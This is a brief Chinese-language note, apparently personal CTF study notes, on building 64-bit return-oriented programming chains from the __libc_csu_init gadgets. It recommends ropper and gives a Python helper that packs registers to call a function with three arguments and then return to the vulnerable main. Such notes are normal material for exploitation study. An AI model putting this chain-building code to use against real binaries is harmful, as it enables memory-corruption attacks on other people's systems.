## rop
主要是64bit的

## func

64bit构造rop，利用libc_cus_init处相关rop。

ropper查找较全面


```Python
def prod_rop3(func_addr, arg1, arg2, arg3):
    payload = p64(rop64_step1_addr)
    payload += p64(0)
    payload += p64(0)   # rbx
    payload += p64(1)   # rbp
    payload += p64(func_addr)   # r12
    payload += p64(arg1)        # r13
    payload += p64(arg2)        # r14
    payload += p64(arg3)        # r15
    payload += p64(rop64_step2_addr)    # ret to step2
    payload += 'r'*rop_pad_size         # padding
    payload += p64(main_vuln_addr)      # return to main vuln
    return payload

```

